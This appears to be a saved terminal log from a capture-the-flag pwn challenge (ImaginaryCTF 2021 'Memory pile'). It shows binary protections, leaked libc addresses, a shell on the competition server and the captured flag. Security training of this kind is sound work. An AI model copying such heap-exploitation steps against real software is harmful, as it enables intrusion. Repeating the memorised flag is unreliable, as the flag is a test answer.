@@ -1,0 +1,28 @@
+mito@ubuntu:~/CTF/ImaginaryCTF_2021/Pwn_Memory_pile_300$ python solve.py r
+[*] '/home/mito/CTF/ImaginaryCTF_2021/Pwn_Memory_pile_300/memory_pile'
+    Arch:     amd64-64-little
+    RELRO:    Full RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+    RUNPATH:  './'
+[+] Opening connection to chal.imaginaryctf.org on port 42007: Done
+[*] '/home/mito/CTF/ImaginaryCTF_2021/Pwn_Memory_pile_300/libc-2.27.so'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+printf_addr = 0x7f2b6994af00
+libc_base   = 0x7f2b698e6000
+[*] Switching to interactive mode
+$ id
+uid=1000 gid=1000 groups=1000
+$ ls -l
+total 2184
+-rw-r--r-- 1 nobody nogroup      29 Jul 26 14:33 flag.txt
+-rwxr-xr-x 1 nobody nogroup  170960 Jul 26 14:33 ld-2.27.so
+-rwxr-xr-x 1 nobody nogroup 2030544 Jul 26 14:33 libc-2.27.so
+-rwxr-xr-x 1 nobody nogroup   25328 Jul 26 14:33 run
+$ cat flag.txt
+ictf{hemlock_for_the_tcache}
